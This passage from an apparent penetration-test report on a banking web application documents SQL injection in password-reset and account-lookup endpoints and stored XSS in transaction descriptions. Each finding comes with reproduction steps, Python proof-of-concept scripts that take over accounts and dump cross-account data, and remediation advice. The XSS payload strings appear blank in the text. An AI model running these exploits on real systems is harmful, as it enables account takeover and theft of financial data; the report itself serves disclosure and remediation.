    true_probe = {"username": "doesnotexist_fp' OR '1'='1"}
    false_probe = {"username": "doesnotexist_fp' OR '1'='2"}

    print("Reproducing SQL injection in forgot-password endpoints")
    print()

    for path in ("/api/v1/forgot-password", "/api/v2/forgot-password"):
        show("Baseline nonexistent user", path, baseline)
        show("Error-based probe", path, error_probe)
        status_true, data_true = show("Boolean true probe", path, true_probe)
        status_false, data_false = show("Boolean false control", path, false_probe)

        print("-" * 80)
        print("Summary for", path)
        print("True condition status :", status_true)
        print("False condition status:", status_false)

        pin = data_true.get("debug_info", {}).get("pin")
        if pin:
            print("Leaked PIN from response:", pin)
        else:
            print("No PIN disclosed in response for this version")
        print()

    # Optional controlled-account workflow comparison
    victim_user = f"fpdemo_{int(time.time())}"
    victim_pass = "VictimPass!123"
    victim_new_pass = "ResetDone!456"

    print("=" * 80)
    print("Creating controlled victim account:", victim_user)
    reg = requests.post(
        f"{BASE}/register",
        json={"username": victim_user, "password": victim_pass},
        timeout=15,
    )
    print("REGISTER STATUS:", reg.status_code)
    print(reg.text[:800])

    # Normal v1 forgot-password flow
    print("=" * 80)
    print("Normal v1 forgot-password flow for controlled account")
    status_norm, data_norm = post_json("/api/v1/forgot-password", {"username": victim_user})
    print("STATUS:", status_norm)
    print(json.dumps(data_norm, indent=2)[:1000])

    normal_pin = data_norm.get("debug_info", {}).get("pin")
    if normal_pin:
        status_reset, data_reset = post_json(
            "/api/v1/reset-password",
            {
                "username": victim_user,
                "reset_pin": normal_pin,
                "new_password": victim_new_pass,
            },
        )
        print("RESET STATUS:", status_reset)
        print(json.dumps(data_reset, indent=2)[:1000])

    # Injected v1 flow against the same controlled account
    print("=" * 80)
    print("Injected v1 forgot-password flow against controlled account")
    injected_payload = {"username": f"' OR username='{victim_user}'--"}
    status_inj, data_inj = post_json("/api/v1/forgot-password", injected_payload)
    print("STATUS:", status_inj)
    print(json.dumps(data_inj, indent=2)[:1000])

    injected_pin = data_inj.get("debug_info", {}).get("pin")
    if injected_pin:
        status_reset_inj, data_reset_inj = post_json(
            "/api/v1/reset-password",
            {
                "username": victim_user,
                "reset_pin": injected_pin,
                "new_password": "InjectedReset!789",
            },
        )
        print("INJECTED RESET STATUS:", status_reset_inj)
        print(json.dumps(data_reset_inj, indent=2)[:1000])


if __name__ == "__main__":
    main()
```

metadata.remediation:
1. Replace dynamic SQL construction with parameterized queries for all forgot-password lookups in both `v1` and `v2`.
   The `username` value must never be concatenated directly into SQL statements.

2. Remove all debug output from authentication and password-reset responses.
   Do not return SQL errors, stack details, or reset PIN values to clients.

3. Standardize forgot-password responses.
   Return the same generic message regardless of whether a user exists, whether a query matched, or whether the request failed internally, while logging the detailed reason server-side.

4. Harden the password-reset workflow.
   Bind reset tokens/PINs strictly to the correct account record, enforce expiration, rate limiting, and single use, and require verification steps appropriate to the application’s threat model.

5. Review the broader application for the same root cause.
   Similar SQL injection behavior was observed elsewhere in the application. All database access paths should be reviewed for unsafe string interpolation.

6. Retest with the same payload pairs after remediation.
   Verify that:
   - single-quote payloads no longer generate SQL errors,
   - true/false predicate payloads no longer change behavior,
   - reset PINs are never returned in client-visible responses.

title: Stored XSS in Transaction History via Transfer Description
description: A stored cross-site scripting vulnerability was confirmed in the transaction history feature of the banking application. An authenticated user can submit arbitrary HTML and JavaScript in the `description` field of `POST /transfer`. The supplied content is stored with the transaction record and later returned unescaped by the transaction history API. When a user views transaction history in the dashboard, the client-side code renders `t.description` directly into the page using `innerHTML`, causing attacker-controlled markup to execute in the victim’s browser. Validation confirmed both the storage and execution path: The malicious description was accepted by `POST /transfer`, returned verbatim by `GET /transactions/{account_number}`, rendered into `#transaction-list` as an `` tag with an `onerror` handler, and executed in the browser. During validation, execution was confirmed by setting `document.body` attribute `data-xss` to a controlled marker value.
evidence:
An authenticated attacker can execute arbitrary JavaScript in the browser of any user who views a transaction containing the attacker-controlled description. In a banking context, this can enable theft of session tokens from browser-accessible storage, unauthorized actions on behalf of the victim, manipulation of account data presented in the interface, phishing overlays, and pivoting into other sensitive workflows exposed to the victim account. Because transaction descriptions can be delivered to another account through a transfer, the issue is exploitable cross-user and is not limited to self-XSS. The vulnerable flow is: User input source: `POST /transfer` accepts JSON with a user-controlled `description` field. Stored data exposure: The description is persisted and returned unescaped by `GET /transactions/{account_number}`. Validation showed payloads such as `` and `` appearing verbatim in API responses. Client-side sink: The dashboard transaction history logic constructs HTML using a template literal that embeds `t.description` directly: `${t.description ? \`
${t.description}
\` : ''}` It then injects the generated markup with: `document.getElementById('transaction-list').innerHTML = transactionHtml;` Because no output encoding or sanitization is applied before insertion into the DOM, attacker-controlled HTML is interpreted by the browser. Validation confirmed that rendered payloads became live DOM elements and their event handlers executed. Execution evidence: A validation payload set `document.body` attribute `data-xss` to `XSS_DOM_MARK_177663`. After loading the victim transaction history page, the DOM reflected: `bodyAttr: 'XSS_DOM_MARK_177663'` and `#transaction-list` contained `` elements with attacker-controlled `onerror` handlers. This confirms real JavaScript execution rather than harmless reflection.
steps: To reproduce: 1. Register two standard user accounts, one attacker account and one victim account. 2. Log in as the attacker and obtain the attacker account number. 3. Log in as the victim and obtain the victim account number. 4. As the attacker, submit a transfer to the victim with a malicious description, for example: `` 5. Confirm that the victim transaction history API returns the payload unescaped by requesting: `GET /transactions/{victim_account_number}` 6. Log in as the victim in a browser and open: `http://bank:5000/dashboard#transactions` 7. Observe that the malicious description is rendered as HTML rather than text. 8. Confirm execution by checking that the page DOM now contains: `document.body.getAttribute('data-xss') === 'XSS_VICTIM_177663'` Observed validation evidence: A separate payload, ``, was stored, rendered in transaction history, and executed successfully in the browser during validation. ``` import time import requests BASE = "http://bank:5000" PASSWORD = "Passw0rd!123" def register_and_login(username: str) -> tuple[str, str]: requests.post( f"{BASE}/register", json={"username": username, "password": PASSWORD}, timeout=10, ) resp = requests.post( f"{BASE}/login", json={"username": username, "password": PASSWORD}, timeout=10, ) resp.raise_for_status() data = resp.json() return data["token"], data["accountNumber"] def main() -> None: attacker = f"attacker_{int(time.time())}" victim = f"victim_{int(time.time())}" attacker_token, attacker_account = register_and_login(attacker) victim_token, victim_account = register_and_login(victim) payload = '' transfer_resp = requests.post( f"{BASE}/transfer", headers={ "Authorization": f"Bearer {attacker_token}", "Content-Type": "application/json", }, json={ "to_account": victim_account, "amount": 1, "description": payload, }, timeout=10, ) print("Transfer response:", transfer_resp.status_code, transfer_resp.text) victim_tx_resp = requests.get( f"{BASE}/transactions/{victim_account}", headers={"Authorization": f"Bearer {victim_token}"}, timeout=10, ) print("Victim transaction history response:", victim_tx_resp.status_code) print(victim_tx_resp.text) if "XSS_VICTIM_177663" in victim_tx_resp.text: print("[+] Payload stored and returned unescaped in victim transaction history") else: print("[-] Payload not observed in victim transaction history response") print() print("Manual browser confirmation:") print(f"1. Log in as victim user: {victim}") print(f"2. Open {BASE}/dashboard#transactions") print("3. In the browser console, run:") print(" document.body.getAttribute('data-xss')") print("4. Expected result after page load:") print(" XSS_VICTIM_177663") if __name__ == "__main__": main() ```

metadata.remediation: 1. Remove unsafe HTML rendering from transaction history. Replace `innerHTML`-based rendering with safe DOM construction using `textContent` or equivalent APIs for all untrusted values, including transaction descriptions. 2. Apply contextual output encoding. Ensure user-controlled fields are encoded for the HTML context before being inserted into the page. Do not treat transaction descriptions as trusted HTML. 3. Sanitize stored rich text if HTML is intentionally supported. If formatted descriptions are a business requirement, apply a strict allowlist-based HTML sanitizer on the server and enforce a minimal safe subset of tags and attributes. Event handlers, scriptable URLs, and active content must be removed. 4. Treat transaction descriptions as plain text by default. Enforce server-side validation to reject or normalize HTML input where rich content is not required. 5. Add defense in depth in the browser. Deploy a restrictive Content Security Policy that blocks inline script execution and event handler execution where possible. This will not replace proper output encoding, but it will reduce exploitability. 6. Add regression tests. Create automated tests that verify payloads such as `` are rendered as inert text in transaction history and related UI components.

title: SQL Injection in Account Lookup Endpoints Enables Unauthorized Balance and Transaction Disclosure
description:
A SQL injection vulnerability was confirmed in multiple account-number based endpoints exposed by the banking application. The affected endpoints interpolate the user-supplied `account_number` directly into backend SQL queries without safe parameterization.

The issue affects the following endpoints:

`GET /check_balance/{account_number}`
`GET /transactions/{account_number}`
`GET /api/transactions?account_number=...`

The vulnerable behavior was validated with baseline, error-based, and boolean-based testing. A single quote produced database error responses that exposed SQL parser failures and query fragments. Boolean payloads such as `' OR '1'='1` altered query logic and caused the application to return records unrelated to the supplied account number.

Two of the affected endpoints are reachable without authentication, allowing direct unauthorized disclosure of account data. The authenticated API variant is also vulnerable and allows any authenticated user to retrieve cross-account transaction data by supplying a crafted query value.
evidence:
An external attacker can retrieve arbitrary account balance information and large volumes of transaction history without authorization. The vulnerability breaks account isolation and exposes sensitive financial data belonging to other users.

Observed impact included:
- Disclosure of the administrative account balance and username through the balance lookup endpoint
- Retrieval of 95 transaction records across multiple accounts through transaction history endpoints
- Direct exploitation without authentication on two public endpoints
- Cross-account data exfiltration by any authenticated user through the API endpoint

In a banking context, this materially increases the risk of privacy violations, targeted fraud, financial profiling, and further account abuse based on disclosed account relationships and transaction metadata.

The affected functionality accepts an account identifier from either a path segment or query parameter and uses it in SQL statements without parameter binding. This allows attacker-controlled input to break out of the intended string context and modify the query predicate.

The vulnerability was demonstrated through three complementary behaviors.

First, error-based confirmation showed that a lone single quote triggered backend SQL errors. For example, `/check_balance/doesnotexist'` returned an error indicating an unterminated quoted string and exposed the query pattern `WHERE account_number='doesnotexist''`. Similar behavior was observed on `/transactions/{account_number}` and `/api/transactions?account_number=` with query fragments showing direct interpolation into `WHERE` clauses.

Second, boolean-based exploitation proved control over query logic. Supplying `doesnotexist' OR '1'='1` to `/check_balance/{account_number}` returned the administrative record, including username `admin` and balance `1000000.0`, while the negative control `doesnotexist' OR '1'='2` returned `404 Account not found`.

Third, the same boolean technique on `/transactions/{account_number}` and `/api/transactions?account_number=` caused broad transaction disclosure. The true-condition payload returned 95 transactions spanning multiple accounts, while the false-condition payload returned zero transactions.

These results confirm a shared SQL injection root cause across all three endpoints. The vulnerability primarily impacts confidentiality by exposing sensitive account and transaction data across tenant and account boundaries.
steps:
To reproduce:

1. Create a normal user account with `POST /register` and log in with `POST /login`.
2. Record the issued account number and JWT token from the login response.
3. Confirm baseline behavior:
   - Request `GET /check_balance/{your_account_number}` and observe only the test account data.
   - Request `GET /check_balance/doesnotexist` and observe `404 Account not found`.
   - Request `GET /transactions/{your_account_number}` and observe only the test account history.
   - Request `GET /transactions/doesnotexist` and observe an empty result set.
   - Request `GET /api/transactions?account_number={your_account_number}` with `Authorization: Bearer <token>` and observe only the test account history.
4. Confirm SQL parser influence with a single quote:
   - Request `GET /check_balance/doesnotexist'`
   - Request `GET /transactions/doesnotexist'`
   - Request `GET /api/transactions?account_number=doesnotexist'` with the bearer token
   - Observe SQL error responses indicating unescaped input was inserted into backend queries.
5. Confirm boolean exploitation:
   - Request `GET /check_balance/doesnotexist' OR '1'='1` and observe disclosure of the admin account record.
   - Request `GET /check_balance/doesnotexist' OR '1'='2` and observe `404 Account not found`.
   - Request `GET /transactions/doesnotexist' OR '1'='1` and observe a large transaction set across multiple accounts.
   - Request `GET /transactions/doesnotexist' OR '1'='2` and observe zero transactions.
   - Request `GET /api/transactions?account_number=doesnotexist' OR '1'='1` with the bearer token and observe the same cross-account transaction disclosure.
   - Request `GET /api/transactions?account_number=doesnotexist' OR '1'='2` with the bearer token and observe zero transactions.
6. Compare the true and false conditions. The response differences confirm the injection is exploitable and allows unauthorized disclosure.

```
import requests
import secrets
from urllib.parse import quote

BASE = "http://bank:5000"


def register_and_login():
    username = "acctrep_" + secrets.token_hex(4)
    password = "Passw0rd!123"

    reg = requests.post(
        f"{BASE}/register",
        json={"username": username, "password": password},
        timeout=10,
    )
    reg.raise_for_status()
    reg_data = reg.json()
    account_number = reg_data["debug_data"]["account_number"]

    login = requests.post(
        f"{BASE}/login",
        json={"username": username, "password": password},
        timeout=10,
    )
    login.raise_for_status()
    token = login.json()["token"]

    return username, password, account_number, token


def show_response(label, response):
    print(f"\n=== {label} ===")
    print("Status:", response.status_code)
    print(response.text[:1200])


def main():
    username, password, account_number, token = register_and_login()
    print("Test user:", username)
    print("Account number:", account_number)

    headers = {"Authorization": f"Bearer {token}"}

    baseline = [
        ("check_balance baseline", f"{BASE}/check_balance/{account_number}", {}),
        ("check_balance nonexistent", f"{BASE}/check_balance/doesnotexist", {}),
        ("transactions baseline", f"{BASE}/transactions/{account_number}", {}),
        ("transactions nonexistent", f"{BASE}/transactions/doesnotexist", {}),
        (
            "api transactions baseline",
            f"{BASE}/api/transactions?account_number={account_number}",
            headers,
        ),
        (
            "api transactions nonexistent",
            f"{BASE}/api/transactions?account_number=doesnotexist",
            headers,
        ),
    ]

    for label, url, hdrs in baseline:
        resp = requests.get(url, headers=hdrs, timeout=10)
        show_response(label, resp)

    error_payload = quote("doesnotexist'", safe="")
    boolean_true = quote("doesnotexist' OR '1'='1", safe="")
    boolean_false = quote("doesnotexist' OR '1'='2", safe="")

    probes = [
        ("check_balance error", f"{BASE}/check_balance/{error_payload}", {}),
        ("transactions error", f"{BASE}/transactions/{error_payload}", {}),
        (
            "api transactions error",
            f"{BASE}/api/transactions?account_number={error_payload}",
            headers,
        ),
        ("check_balance true", f"{BASE}/check_balance/{boolean_true}", {}),
        ("check_balance false", f"{BASE}/check_balance/{boolean_false}", {}),
        ("transactions true", f"{BASE}/transactions/{boolean_true}", {}),
        ("transactions false", f"{BASE}/transactions/{boolean_false}", {}),
        (
            "api transactions true",
            f"{BASE}/api/transactions?account_number={boolean_true}",
            headers,
        ),
        (
            "api transactions false",
            f"{BASE}/api/transactions?account_number={boolean_false}",
            headers,
        ),
    ]

    for label, url, hdrs in probes:
        resp = requests.get(url, headers=hdrs, timeout=10)
        show_response(label, resp)


if __name__ == "__main__":
    main()
```

metadata.remediation:
1. Replace all string-concatenated SQL in account lookup and transaction queries with parameterized statements or prepared queries.
2. Treat all path and query inputs as untrusted data and bind them as parameters rather than interpolating them into SQL strings.
3. Remove detailed database error messages from client responses. Return generic error messages and log full database diagnostics only on the server side.
4. Enforce authorization checks on every balance and transaction lookup so users can only access data belonging to their own account, regardless of query correctness.
5. Add regression tests that cover:
   - Single-quote payloads
   - Boolean SQLi payloads
   - Negative authorization cases for cross-account requests
6. Review other endpoints that use identifiers such as account numbers, user IDs, card IDs, and loan IDs for the same query-construction flaw.
7. After remediation, retest all three endpoints with the proof-of-concept payloads to confirm that:
   - SQL errors are no longer exposed
   - boolean conditions no longer alter query behavior
   - only authorized account data is returned

title: SQL Injection in Account Lookup and Transaction Retrieval Endpoints
description:
A SQL injection vulnerability was confirmed in the account lookup and transaction retrieval functionality exposed through three related endpoints: `GET /check_balance/{account_number}`, `GET /transactions/{account_number}`, and `GET /api/transactions?account_number=`.

These endpoints accept an `account_number` value and use it in backend database queries without adequate parameterization. Validation demonstrated both error-based and boolean-based SQL injection behavior against the same logical input across the affected routes.

A standard user account was created for validation. Benign requests returned only the tester's own balance and an empty transaction history. Supplying a single quote produced PostgreSQL error messages, and supplying a tautology payload returned other customers' financial data. The authenticated API endpoint was also vulnerable, allowing a normal user to retrieve cross-account transaction history outside their authorized scope.
evidence:
An attacker can extract sensitive banking data belonging to other customers, including balances, usernames, account numbers present in transaction records, and transaction history.

Business impact includes unauthorized exposure of financial records, loss of customer confidentiality, potential regulatory impact, and erosion of trust in account isolation controls. Because one affected endpoint is accessible to any authenticated user, a low-privileged account can be used to exfiltrate data from unrelated customer accounts. Error messages also disclose backend database behavior, which materially lowers exploitation effort.

The vulnerable behavior is consistent across all three affected endpoints and appears to stem from unsafe SQL construction using the user-controlled `account_number` value inside string literals.

Observed evidence supporting a shared root cause:
The balance lookup endpoint returned a PostgreSQL error after a single quote was appended to the path value, indicating the supplied account number was inserted directly into a quoted SQL expression. The transaction history endpoint leaked a PostgreSQL syntax error together with the constructed SQL statement, showing logic equivalent to `WHERE from_account='[input]' OR to_account='[input]'`. The authenticated `/api/transactions` endpoint produced the same class of error when the query parameter contained a trailing quote.

Exploitation was then confirmed by using the payload `8307531910' OR '1'='1`. On the balance endpoint, the response changed from the tester's own account data to another user's data. On both transaction endpoints, the same injected value caused the application to return 41 transactions spanning multiple unrelated accounts, confirming that the predicate was expanded beyond the intended account scope.

The issue therefore represents confirmed SQL injection with direct unauthorized data disclosure, not merely verbose error handling. The backend database is PostgreSQL based on returned parser errors.
steps:
Reproduction steps:

1. Register a standard user account and log in to obtain a JWT.
2. Record the issued account number from the registration or login response.
3. Send benign requests:
   - `GET /check_balance/{account_number}`
   - `GET /transactions/{account_number}`
   - `GET /api/transactions?account_number={account_number}` with `Authorization: Bearer <token>`
4. Observe that these benign requests return only the tester's own data.
5. Send error-confirmation requests by appending a single quote:
   - `GET /check_balance/{account_number}%27`
   - `GET /transactions/{account_number}%27`
   - `GET /api/transactions?account_number={account_number}%27`
6. Observe PostgreSQL error responses. The transaction endpoint also reveals the constructed SQL condition containing the unsafely embedded input.
7. Send the boolean-tautology payload:
   - `GET /check_balance/{account_number}%27%20OR%20%271%27=%271`
   - `GET /transactions/{account_number}%27%20OR%20%271%27=%271`
   - `GET /api/transactions?account_number={account_number}%27%20OR%20%271%27=%271` with the JWT
8. Observe unauthorized disclosure:
   - The balance lookup returns another user's balance and username instead of the tester's own record.
   - Both transaction endpoints return cross-account transaction history for many unrelated accounts.

Validated examples:
- Baseline `GET /check_balance/8307531910` returned `username: sqli_val_acct` and `balance: 1000.0`
- Injected `GET /check_balance/8307531910%27%20OR%20%271%27=%271` returned `username: race_src_nmj7ciyk` and `balance: 100.0`
- Injected transaction requests returned 41 transaction records involving unrelated accounts such as `2613619629`, `6142382971`, `0613135848`, `9119286854`, `3609910052`, `1607813602`, `7632399459`, and `3153853739`

```
import json
import random
import string

import requests

BASE = "http://bank:5000"


def rand_user(prefix="sqliacct"):
    suffix = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    return f"{prefix}_{suffix}"


def register_and_login():
    username = rand_user()
    password = "ValPass!234"

    reg = requests.post(
        f"{BASE}/register",
        json={"username": username, "password": password},
        timeout=15,
    )
    reg.raise_for_status()
    reg_data = reg.json()
    account_number = reg_data["debug_data"]["account_number"]

    login = requests.post(
        f"{BASE}/login",
        json={"username": username, "password": password},
        timeout=15,
    )
    login.raise_for_status()
    login_data = login.json()
    token = login_data["token"]

    return username, password, account_number, token


def show(label, response):
    print("=" * 80)
    print(label)
    print("Status:", response.status_code)
    print(response.text[:2000])


def main():
    username, password, account_number, token = register_and_login()
    print("Registered user:", username)
    print("Account number:", account_number)

    headers = {"Authorization": f"Bearer {token}"}

    baseline_balance = requests.get(f"{BASE}/check_balance/{account_number}", timeout=15)
    baseline_tx_path = requests.get(f"{BASE}/transactions/{account_number}", timeout=15)
    baseline_tx_api = requests.get(
        f"{BASE}/api/transactions",
        params={"account_number": account_number},
        headers=headers,
        timeout=15,
    )

    inj = f"{account_number}' OR '1'='1"
    err = f"{account_number}'"

    error_balance = requests.get(f"{BASE}/check_balance/{requests.utils.quote(err, safe='')}", timeout=15)
    error_tx_path = requests.get(f"{BASE}/transactions/{requests.utils.quote(err, safe='')}", timeout=15)
    error_tx_api = requests.get(
        f"{BASE}/api/transactions",
        params={"account_number": err},
        headers=headers,
        timeout=15,
    )

    sqli_balance = requests.get(f"{BASE}/check_balance/{requests.utils.quote(inj, safe='')}", timeout=15)
    sqli_tx_path = requests.get(f"{BASE}/transactions/{requests.utils.quote(inj, safe='')}", timeout=15)
    sqli_tx_api = requests.get(
        f"{BASE}/api/transactions",
        params={"account_number": inj},
        headers=headers,
        timeout=15,
    )

    show("Baseline balance", baseline_balance)
    show("Baseline transaction path", baseline_tx_path)
    show("Baseline transaction API", baseline_tx_api)

    show("Error-based confirmation: balance", error_balance)
    show("Error-based confirmation: transaction path", error_tx_path)
    show("Error-based confirmation: transaction API", error_tx_api)

    show("SQLi exploitation: balance", sqli_balance)
    show("SQLi exploitation: transaction path", sqli_tx_path)
    show("SQLi exploitation: transaction API", sqli_tx_api)

    try:
        bal = sqli_balance.json()
        print("Unauthorized balance record:", json.dumps(bal, indent=2))
    except Exception:
        pass

    for name, resp in [("transaction path", sqli_tx_path), ("transaction API", sqli_tx_api)]:
        try:
            data = resp.json()
            rows = data.get("transactions", [])
            print(f"{name} returned {len(rows)} transactions")
            print(json.dumps(rows[:5], indent=2))
        except Exception:
            pass


if __name__ == "__main__":
    main()
```

metadata.remediation:
1. Replace all dynamic SQL built from `account_number` with parameterized queries or prepared statements.
2. Ensure path and query parameter values are never concatenated directly into SQL strings, including in compound predicates such as `WHERE from_account = ? OR to_account = ?`.
3. Remove verbose database error messages from client responses and return generic error objects instead.
4. Enforce authorization checks independently of query filtering so users can only access balances and transactions for accounts they own.
5. Add regression tests covering:
   - Single-quote input handling
   - Boolean-tautology payloads
   - Negative authorization cases for cross-account access
6. Review similar endpoints that accept account numbers, user identifiers, or financial object references for the same unsafe query construction pattern.

title: Stored Cross-User XSS in Dashboard Transaction History
description:
A stored cross-site scripting vulnerability was confirmed in the banking application’s transaction history workflow.

An authenticated user can submit JavaScript within the `description` field of a transfer request. The application stores this value server-side and later returns it unmodified in the transaction history API response. When another user views the dashboard, the transaction history component renders the description as HTML rather than text, causing the attacker-supplied script to execute in the victim’s browser.

This issue is not limited to self-view. Cross-user impact was validated by creating two separate accounts, sending a transfer from the attacker account to the victim account with a malicious description, and then confirming JavaScript execution when the victim opened the dashboard.
evidence: An authenticated attacker can execute arbitrary JavaScript in another user’s banking session by sending a malicious transfer description. Validated impact includes: - Execution of attacker-controlled JavaScript in the victim’s browser - Access to the victim’s session context in the dashboard - Theft of the JWT token stored in `localStorage` - Potential account takeover by replaying the stolen bearer token - Unauthorized access to balances, transaction history, virtual card features, bill payment features, and other actions available to the victim Because the vulnerability is triggered through a normal banking workflow and the payload is stored server-side, it can be used to target any user who receives or views a malicious transaction entry. The vulnerable flow spans three application behaviors: Overview The transfer endpoint accepts attacker-controlled text in the `description` field. The transaction history endpoint returns this description without sanitization or output encoding. The dashboard then injects the description into the DOM using unsafe HTML rendering, which causes the browser to interpret the value as markup and execute embedded event handlers. Affected assets The issue affects the transaction workflow exposed through: - `POST /transfer` - `GET /transactions/{account_number}` - `GET /dashboard` Technical details A malicious description such as `` was submitted through the transfer functionality from one authenticated account to another. The payload was stored and later appeared verbatim in the victim account’s transaction history response. When the victim logged in and viewed the dashboard, the transaction history HTML contained the payload inside the rendered transaction description element. Execution was confirmed in the victim session by observing that the injected script: - Set a custom `data-xss` attribute on `document.body` - Wrote attacker-chosen markers into `localStorage` - Read the victim JWT from `localStorage` and copied it to another storage key The root cause is unsafe client-side rendering of untrusted server-provided transaction data with `innerHTML` semantics rather than safe text insertion. The exposure is amplified by storing the authentication token in `localStorage`, which makes token theft trivial once XSS is achieved.
steps: To reproduce: 1. Register two standard user accounts, referred to as Attacker and Victim. 2. Log in as the Attacker and note the attacker bearer token and Victim account number. 3. Send a transfer to the Victim account using a malicious description payload, for example: `` 4. Confirm persistence by requesting `GET /transactions/{victim_account_number}` with the Victim bearer token and observing that the `description` field contains the payload without sanitization. 5. Log in to the Victim account in a browser and open `/dashboard`. 6. Observe that the payload is rendered inside the transaction history and executes automatically. 7. Validate execution in the browser context, for example: - `document.body.getAttribute('data-xss')` returns `victim` - `localStorage.getItem('xss_exec')` returns `victim` - `localStorage.getItem('stolen_token') === localStorage.getItem('jwt_token')` evaluates to `true` Validated example data: - Attacker account number: `8361120212` - Victim account number: `3128379224` Observed API evidence: - `POST /transfer` accepted the payload and returned success - `GET /transactions/3128379224` returned the malicious HTML in the `description` field -
